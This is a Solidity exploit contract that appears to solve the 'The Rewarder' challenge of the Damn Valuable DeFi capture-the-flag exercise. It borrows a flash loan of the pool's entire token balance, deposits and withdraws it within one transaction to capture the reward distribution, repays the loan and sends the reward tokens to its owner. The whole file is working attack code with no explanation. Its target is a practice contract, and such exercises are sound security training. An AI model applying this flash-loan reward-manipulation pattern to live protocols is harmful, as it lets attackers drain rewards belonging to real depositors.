// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract AttackRewarder is Ownable{
    // TrusterLenderPool private immutable pool;
    FlashLoanerPool private immutable flashLoanPool;
    TheRewarderPool private immutable rewardPool;
    IERC20 public immutable damnValuableToken;
    IERC20 public immutable rewardToken;

    constructor(address flashLoanPoolAddress, address damnTokenAddress, address rewardPoolAddress, address rewardTokenAddress) {
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        damnValuableToken = IERC20(damnTokenAddress);    
        rewardToken = IERC20(rewardTokenAddress);    
    }

    function attack() public onlyOwner {
        uint256 damnTokenBalance = damnValuableToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(damnTokenBalance);
    
    }

    function receiveFlashLoan(uint256 amount) public {

        damnValuableToken.approve(address(rewardPool), type(uint256).max);
        rewardPool.deposit(amount);

        rewardPool.withdraw(amount);
  
        damnValuableToken.transfer(address(flashLoanPool), amount);

    }

    function withdrawReward() public onlyOwner {
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rewardBalance);
    }

}